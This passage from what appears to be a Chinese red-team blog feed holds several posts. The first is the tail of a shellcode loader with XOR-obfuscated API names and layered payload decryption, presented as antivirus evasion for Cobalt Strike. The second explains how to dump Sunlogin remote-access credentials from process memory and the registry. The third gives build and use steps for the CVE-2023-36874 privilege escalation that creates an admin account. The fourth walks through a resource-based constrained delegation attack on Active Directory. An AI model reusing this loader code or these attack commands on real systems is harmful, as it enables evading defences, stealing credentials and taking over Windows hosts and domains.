(PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader-&gt;e_lfanew);</span><br><span class="line">  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + </span><br><span class="line">  ntHeaders-&gt;OptionalHeader.DataDirectory<span class="literal">[IMAGE<span class="identifier">_DIRECTORY_ENTRY_EXPORT</span>]</span>.VirtualAddress);</span><br><span class="line">  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line">  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNames);</span><br><span class="line">  for (DWORD i = <span class="number">0</span>; i &lt; exportDirectory-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(lpProcName, (const <span class="built_in">char</span>*)hModule + addressOfNames<span class="literal">[<span class="identifier">i</span>]</span>)<span class="operator"> == </span><span class="number">0</span>) &#123;</span><br><span class="line">      return (FARPROC)((BYTE*)hModule + addressOfFunctions<span class="literal">[<span class="identifier">addressOfNameOrdinals</span>[<span class="identifier">i</span>]</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">char</span> s_NAVM<span class="literal">[]</span> = &#123; <span class="number">0x23</span>,<span class="number">0x0d</span>,<span class="number">0x32</span>,<span class="number">0x19</span>,<span class="number">0x1c</span>,<span class="number">0x0a</span> &#125;;</span><br><span class="line"><span class="built_in">char</span> s_mb<span class="literal">[]</span> = &#123; <span class="number">0x23</span>,<span class="number">0x0d</span>,<span class="number">0x24</span>,<span class="number">0x07</span>,<span class="number">0x19</span>,<span class="number">0x11</span> &#125;;</span><br><span class="line"><span class="built_in">char</span> s_dll<span class="literal">[]</span> = &#123; <span class="number">0x03</span>,<span class="number">0x0d</span>,<span class="number">0x17</span>,<span class="number">0x19</span> &#125;;</span><br><span class="line"><span class="built_in">char</span> s_key<span class="literal">[]</span> = <span class="string">"xxx"</span>;</span><br><span class="line">void <span class="constructor">XOR(<span class="params">char</span> <span class="operator">*</span> <span class="params">data</span>, <span class="params">size_t</span> <span class="params">data_len</span>, <span class="params">char</span> <span class="operator">*</span> <span class="params">key</span>, <span class="params">size_t</span> <span class="params">key_len</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> j;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data_len; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j<span class="operator"> == </span>key_len - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line">    data<span class="literal">[<span class="identifier">i</span>]</span> = data<span class="literal">[<span class="identifier">i</span>]</span> ^ key<span class="literal">[<span class="identifier">j</span>]</span>;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, <span class="built_in">char</span>* argv<span class="literal">[]</span>) &#123;</span><br><span class="line">  <span class="constructor">XOR((<span class="params">char</span> <span class="operator">*</span>)</span> s_dll, sizeof(s_dll), s_key, sizeof(s_key));</span><br><span class="line">  <span class="constructor">XOR((<span class="params">char</span> <span class="operator">*</span>)</span> s_mb, sizeof(s_mb), s_key, sizeof(s_key));</span><br><span class="line">  wchar_t wtext<span class="literal">[<span class="number">20</span>]</span>;</span><br><span class="line">  mbstowcs(wtext, s_dll, strlen(s_dll)+<span class="number">1</span>); <span class="comment">//plus null</span></span><br><span class="line">  LPWSTR user_dll = wtext;</span><br><span class="line">  HMODULE <span class="keyword">mod</span> = my<span class="constructor">GetModuleHandle(<span class="params">user_dll</span>)</span>;</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>encryptedpad_len, my_secret_key, sizeof(my_secret_key));</span><br><span class="line">    a5<span class="constructor">_1_decrypt(<span class="params">key</span>, <span class="params">key_len</span>, <span class="params">encrypted</span>, <span class="params">pad_len</span>, <span class="params">decrypted</span>)</span>;</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>s_NAVM, sizeof(s_NAVM), s_key, sizeof(s_key));</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>s_dll, sizeof(s_dll), s_key, sizeof(s_key));</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>s_mb, sizeof(s_mb), s_key, sizeof(s_key));</span><br><span class="line">    wchar_t wtext<span class="literal">[<span class="number">20</span>]</span>;</span><br><span class="line">    mbstowcs(wtext, s_dll, strlen(s_dll) + <span class="number">1</span>); <span class="comment">//plus null</span></span><br><span class="line">    LPWSTR ntdll_dll = wtext;</span><br><span class="line">    HMODULE <span class="keyword">mod</span> = my<span class="constructor">GetModuleHandle(<span class="params">ntdll_dll</span>)</span>;</span><br><span class="line">    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)my<span class="constructor">GetProcAddress(<span class="params">mod</span>, (LPCSTR)</span>s_NAVM);</span><br><span class="line">    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)my<span class="constructor">GetProcAddress(<span class="params">mod</span>, (LPCSTR)</span>s_mb);</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shellcode加密"><a href="#shellcode加密" class="headerlink" title="shellcode加密"></a>shellcode加密</h1><p>XOR+DES+a5_1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> a5_1_decrypt(unsigned char* key, <span class="built_in">int</span> key_len, unsigned char* cipher, <span class="built_in">int</span> cipher_len, unsigned char* <span class="keyword">out</span>) &#123;</span><br><span class="line">    <span class="comment">// initialization</span></span><br><span class="line">    unsigned <span class="built_in">int</span> R1 = <span class="number">0</span>, R2 = <span class="number">0</span>, R3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">int</span> feedback = ((key[i % key_len] &gt;&gt; (i / <span class="number">8</span>)) &amp; <span class="number">1</span>) ^ ((R1 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">1</span>) ^ ((R2 &gt;&gt; <span class="number">21</span>) &amp; <span class="number">1</span>) ^ ((R3 &gt;&gt; <span class="number">22</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        R1 = (R1 &lt;&lt; <span class="number">1</span>) | feedback;</span><br><span class="line">        R2 = (R2 &lt;&lt; <span class="number">1</span>) | ((R1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        R3 = (R3 &lt;&lt; <span class="number">1</span>) | ((R2 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// decryption</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; cipher_len; i++) &#123;</span><br><span class="line">        <span class="built_in">int</span> feedback = A5_STEP((R1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>, (R2 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>, (R3 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        unsigned char key_byte = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">int</span> bit = A5_STEP((R1 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">1</span>, (R2 &gt;&gt; <span class="number">21</span>) &amp; <span class="number">1</span>, (R3 &gt;&gt; <span class="number">22</span>) &amp; <span class="number">1</span>) ^ feedback;</span><br><span class="line">            key_byte |= bit &lt;&lt; j;</span><br><span class="line">            R1 = (R1 &lt;&lt; <span class="number">1</span>) | bit;</span><br><span class="line">            R2 = (R2 &lt;&lt; <span class="number">1</span>) | ((R1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>);</span><br><span class="line">            R3 = (R3 &lt;&lt; <span class="number">1</span>) | ((R2 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">out</span>[i] = cipher[i] ^ key_byte;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">void</span> XOR(char* data, size_t data_len, char* key, size_t key_len) &#123;</span><br><span class="line">    <span class="built_in">int</span> j;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data_len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == key_len - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line">        data[i] = data[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> deAES() &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// decrypt with ECB mode</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.SetKey(key, sizeof(key));</span><br><span class="line">        StringSource(strPlain, <span class="literal">true</span>,</span><br><span class="line">            new HexDecoder(</span><br><span class="line">                new StringSink(strCipher)</span><br><span class="line">            ) <span class="comment">//</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// The StreamTransformationFilter removes padding as required.</span></span><br><span class="line">        StringSource s(strCipher, <span class="literal">true</span>,</span><br><span class="line">            new StreamTransformationFilter(d,</span><br><span class="line">                new StringSink(strRecovered) <span class="comment">// StringSink</span></span><br><span class="line">            ) <span class="comment">// StreamTransformationFilter</span></span><br><span class="line">        ); <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        cerr &lt;&lt; e.what() &lt;&lt; endl;</span><br><span class="line">        exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码就不在这里一一展现了，核心代码都给了，免杀是一个持久化的过程，任何免杀效果在长期来看都是无意义的，主要是学习一个免杀思路。</p><h1 id="免杀情况展示"><a href="#免杀情况展示" class="headerlink" title="免杀情况展示"></a>免杀情况展示</h1><p>用的是原版CS</p><p><img src="/1.png"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.ascotbe.com/2020/05/21/BypassTheVirtualMachine/#%E6%A3%80%E6%9F%A5%E6%97%B6%E9%97%B4%E6%B5%81%E5%8A%A8%E6%80%A7" target="_blank" rel="noopener">木马绕过虚拟机</a></p><p><a href="https://cocomelonc.github.io/malware/2023/06/04/malware-tricks-31.html" target="_blank" rel="noopener">免杀</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵密码抓取（综合）</title>
      <link href="/2023/08/29/%E5%90%91%E6%97%A5%E8%91%B5%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%EF%BC%88%E7%BB%BC%E5%90%88%EF%BC%89/"/>
      <url>/2023/08/29/%E5%90%91%E6%97%A5%E8%91%B5%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%EF%BC%88%E7%BB%BC%E5%90%88%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>向日葵新版密码抓取，必须dump内存，十六进制查找，新版不存在配置文件中，后续会将其他工具的最新手法也同步到博客中来，嗯等我有空的话。。</p><a id="more"></a><p><a name="TV6wQ"></a></p><h2 id="最新版本-内存查找"><a href="#最新版本-内存查找" class="headerlink" title="最新版本-内存查找"></a>最新版本-内存查找</h2><p>首先找到向日葵用户进程，然后使用procdump等工具转储进程内存。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist <span class="string">/v</span> | findstr <span class="string">/i</span> sunlogin</span><br><span class="line">procdump64.exe -accepteula -ma 进程号</span><br></pre></td></tr></table></figure><p>使用Winhex打开转储文件，按下Ctrl+Alt+X快捷键打开十六进制值搜索功能，搜索十六进制值66617374636F646522203A20226b，即可找到本机识别码。<br /></p><p><img src="/1.png" alt="本机识别码"></p><p><br />搜索十六进制值000000000000003C6620663D79616865692E626F6C642E323420633D 636F6C6F725F65646974203E，使用F3快捷键可以跳到下一个匹配处，多跳2次即可找到本机验证码。<br /></p><p><img src="/2.png" alt="本机验证码"></p><p><a name="POI5p"></a></p><h2 id="默认配置文件路径"><a href="#默认配置文件路径" class="headerlink" title="默认配置文件路径:"></a>默认配置文件路径:</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装版：C:<span class="symbol">\P</span>rogram Files<span class="symbol">\O</span>ray<span class="symbol">\S</span>unLogin<span class="symbol">\S</span>unloginClient<span class="symbol">\c</span>onfig.ini</span><br><span class="line">便携版：C:<span class="symbol">\P</span>rogramData<span class="symbol">\O</span>ray<span class="symbol">\S</span>unloginClient<span class="symbol">\c</span>onfig.ini</span><br></pre></td></tr></table></figure><p><img src="/3.png" alt="解密"></p><p><img src="/4.png" alt="默认配置文件路径"></p><p><a name="oBv2C"></a></p><h2 id="新版本-注册表查找"><a href="#新版本-注册表查找" class="headerlink" title="新版本-注册表查找"></a>新版本-注册表查找</h2><p>在向日葵v11.1.2.38529中，强化了加密机制，删除了配置文件config.ini中的fastcode（本机识别码）字段和encry_pwd(本机验证码)字段，而将这些敏感信息放到了注册表中，我们可以通过注册表查询使用Sunflower_get_Password[5]工具即可解密。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_USERS<span class="symbol">\.</span>DEFAULT<span class="symbol">\S</span>oftware<span class="symbol">\O</span>ray<span class="symbol">\S</span>unLogin<span class="symbol">\S</span>unloginClient<span class="symbol">\S</span>unloginInfo</span><br><span class="line">reg query HKEY_USERS<span class="symbol">\.</span>DEFAULT<span class="symbol">\S</span>oftware<span class="symbol">\O</span>ray<span class="symbol">\S</span>unLogin<span class="symbol">\S</span>unloginClient<span class="symbol">\S</span>unloginGreenInfo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> password </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WINDOWS错误报告服务权限提升漏洞-CVE-2023-36874（复现）</title>
      <link href="/2023/08/29/CVE-2023-36874%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
      <url>/2023/08/29/CVE-2023-36874%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>太久没写博客了，最近这段时间项目太多了有点忙，简单把最近跟进的cve复现一下，因为这个是提权漏洞，提权后需要运行自己的exp文件，因为考虑到可能会被查杀，所以文件就不放出来了。</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows错误报告服务是一项用于收集和分析系统和应用程序错误的服务。当发生应用程序崩溃、操作系统故障或其他错误时，Windows错误报告服务会自动收集有关错误的信息。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞成因：</span><br><span class="line"><span class="selector-tag">WER</span>服务从<span class="selector-tag">wer</span><span class="selector-class">.dll</span>调用<span class="selector-tag">WerpSubmitReportFromStore</span>函数</span><br><span class="line">↓</span><br><span class="line">该函数会运行<span class="selector-tag">UtilLaunchWerManager</span>函数</span><br><span class="line">↓</span><br><span class="line">导致执行<span class="selector-tag">CreateProcess</span>函数。</span><br><span class="line">↓</span><br><span class="line">最终去执行<span class="selector-tag">C</span>:\<span class="selector-tag">Windows</span>\<span class="selector-tag">System32</span>\<span class="selector-tag">wermgr</span><span class="selector-class">.exe</span>文件。</span><br><span class="line">而攻击者通过控制重定向后的文件，来使他执行恶意的<span class="selector-tag">wermgr</span><span class="selector-class">.exe</span>文件。</span><br></pre></td></tr></table></figure><p><img src="/1.png" alt="漏洞造成原因"></p><h2 id="打包流程"><a href="#打包流程" class="headerlink" title="打包流程"></a>打包流程</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">打开x64 Native VS命令提示符并转到项目目录</span><br><span class="line"><span class="comment">## 打包. res文件</span></span><br><span class="line">rc.exe Resource.rc</span><br><span class="line"></span><br><span class="line"><span class="comment">## 编译主文件</span></span><br><span class="line">cl main.cpp /EHsc /DUNICODE /link ole32<span class="class">.<span class="keyword">lib</span> <span class="title">oleaut32</span>.<span class="title">lib</span> <span class="title">Resource</span>.<span class="title">res</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">## CD到wermgr目录wermgr.exe打包</span></span><br><span class="line"></span><br><span class="line">cl main.cpp /EHsc /DUNICODE /Fewermgr.exe</span><br></pre></td></tr></table></figure><h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><pre><code>编译后的wermgr. exe，在C:\下新建test\System32文件夹。复制到c:\test\system32\wermgr.exe</code></pre><p><img src="/2.png" alt="文件位置"></p><p>编译后的漏洞利用复制到易受攻击的机器并运行它。确保您运行它的用户不是本地管理员。<br>这应该会在机器上创建“admin”用户。</p><h2 id="创建管理员账户"><a href="#创建管理员账户" class="headerlink" title="创建管理员账户"></a>创建管理员账户</h2><pre><code>编写自己的恶意程序，默认给的添加账户因为太简单，会被火绒查杀。添加账户、设为管理员、添加远程登陆</code></pre><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">main</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><p><img src="/3.png" alt="实现效果"></p><h2 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h2><p><a href="https://github.com/Wh04m1001/CVE-2023-36874" target="_blank" rel="noopener">https://github.com/Wh04m1001/CVE-2023-36874</a><br><a href="https://github.com/crisprss/CVE-2023-36874" target="_blank" rel="noopener">https://github.com/crisprss/CVE-2023-36874</a><br><a href="https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/" target="_blank" rel="noopener">https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于资源的约束性委派利用（RBCD）</title>
      <link href="/2023/03/15/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%EF%BC%88RBCD%EF%BC%89/"/>
      <url>/2023/03/15/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%EF%BC%88RBCD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><a name="SDvMQ"></a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</p><a id="more"></a><p><a name="juYpU"></a></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>msDS-AllowedToActOnBehalfOfOtherIdentity属性作用是控制哪些用户可以模拟成域内任意用户然后向该计算机进行身份验证。如果将这个属性的值配置成我们已经拿到密码的一个机器账户的话，那我们就能以任意成员的身份去控制配置了这个属性的主机。<br />举个例子：在域中，web-Mail$是我们已经拿到密码的机器账户，而我们有权利对web-Mail$这台主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性进行修改，那么我们就能拿到web-Mail$这台主机的所有权限。<br />换句话说如果我们拥有配置某台主机msDS-AllowedToActOnBehalfOfOtherIdentity的权限与创建机器账户的权限，那我们就拿到了此机器的所有权限。<br /><strong>为什么是机器账户，不能是普通用户的账户？</strong></p><blockquote><p>因为攻击的时候会利用到S4U2Self协议，S4U2Self只适用于具有SPN的账户，普通账户是没有SPN的，而<strong>机器账户</strong>默认注册host服务的SPN（host服务中包含cifs、ldap等）。</p></blockquote><p><img src="/2.png" alt="image.png"><br><a name="k0mie"></a></p><h4 id="谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性"><a href="#谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性" class="headerlink" title="谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性?"></a>谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性?</h4><blockquote><ol><li>这台主机的机器账户.</li><li>将这台主机加入到域内的域用户，<strong>该域用户具有对该主机的WriteProperty权限。</strong>（WriteProperty是指拥有写入对象属性的权限）</li></ol></blockquote><p><a name="JFjiG"></a></p><h4 id="域里常见可利用的ACL"><a href="#域里常见可利用的ACL" class="headerlink" title="域里常见可利用的ACL"></a>域里常见可利用的ACL</h4><ul><li>GenericAll ：授予目标对象的完全控制权，包括WriteDacl和WriteOwner特权。</li><li>GenericWrite ：此权限能够更新目标对象的属性值</li><li>Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</li><li>WriteProperty ：WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限</li><li>WriteOwner ：WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限</li><li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利<br><a name="Q0zDY"></a></li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><strong>获得机器账户或者获得将该机器拉入域内的域账户。</strong><br><a name="wy7Ho"></a></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>1、拿到拉入域内机器的域账户<br />2、利用该域账户添加域机器<br />3、修改msDS-AllowedToActOnBehalfOfOtherIdentity值为机器账户的sid<br />4、以机器账户的身份伪造administrator申请一张访问此机器账户的ticket，因为机器账户没有配置约束性委派，所以该<br><a name="KLdDi"></a></p><h2 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h2><p><a name="pfqvj"></a></p><h3 id="msDS-AllowedToActOnBehalfOfOtherIdentity修改权限"><a href="#msDS-AllowedToActOnBehalfOfOtherIdentity修改权限" class="headerlink" title="msDS-AllowedToActOnBehalfOfOtherIdentity修改权限"></a>msDS-AllowedToActOnBehalfOfOtherIdentity修改权限</h3><blockquote><p>GenericAll、GenericWrite、WriteProperty、WriteDacl等等权限都是可以修改账户属性的。</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity susan -Properties objectsid</span><br><span class="line">Get-DomainUser -Identity web<span class="number">-2012</span></span><br><span class="line">全局搜索 SecurityIdentifier             : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1255055821</span><span class="number">-1061842389</span><span class="number">-129624233</span><span class="number">-2103</span></span><br></pre></td></tr></table></figure><p><img src="/3.png" alt="image.png"><br><a name="eJ3B2"></a></p><h3 id="查找将域内机器拉入域的用户SID"><a href="#查找将域内机器拉入域的用户SID" class="headerlink" title="查找将域内机器拉入域的用户SID"></a>查找将域内机器拉入域的用户SID</h3><blockquote><p>如果一个账号没有mS-DS-CreatorSID，那么其是被域管拉入域内的。</p></blockquote><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 通过ADFind查找将域机器拉入域的用户的SID</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369))"</span> <span class="meta">cn</span> mS-DS-CreatorSID</span><br></pre></td></tr></table></figure><p><img src="/4.png" alt="image.png"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b "DC=redteam,DC=com" -f "(&amp;(objectsid=S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1255055821</span><span class="string">-1061842389</span><span class="string">-129624233</span><span class="string">-2103</span>))" objectclass cn dn</span><br></pre></td></tr></table></figure><p><img src="/5.png" alt="image.png"><br><a name="WmxqQ"></a></p><h3 id="定位域用户SID对应的用户名"><a href="#定位域用户SID对应的用户名" class="headerlink" title="定位域用户SID对应的用户名"></a>定位域用户SID对应的用户名</h3><blockquote><p>samAccountType（账号类型）的值最后三位是369证明这是一台机器或者说是机器账号，如果是368就是一个账号(服务账号或者普通账号)。</p></blockquote><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前域账户sid</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">定位当前域账户加入的机器账户</span><br><span class="line">.\AdFind.exe -b "DC=redteam,DC=com" -f "(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1255055821</span><span class="string">-1061842389</span><span class="string">-129624233</span><span class="string">-2103</span>))" cn sAMAccountType objectCategory</span><br></pre></td></tr></table></figure><p><img src="/6.png" alt="image.png"><br><img src="/7.png" alt="image.png"><br><a name="uPjRV"></a></p><h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p><a name="NpOC3"></a></p><h3 id="1、新建机器账户"><a href="#1、新建机器账户" class="headerlink" title="1、新建机器账户"></a>1、新建机器账户</h3><p><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a><br /><a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview" target="_blank" rel="noopener">SharpView</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建机器用户</span></span><br><span class="line">powershell <span class="literal">-exec</span> bypass  <span class="string">'&amp;&#123;import-module .\Powermad.ps1; New-MachineAccount 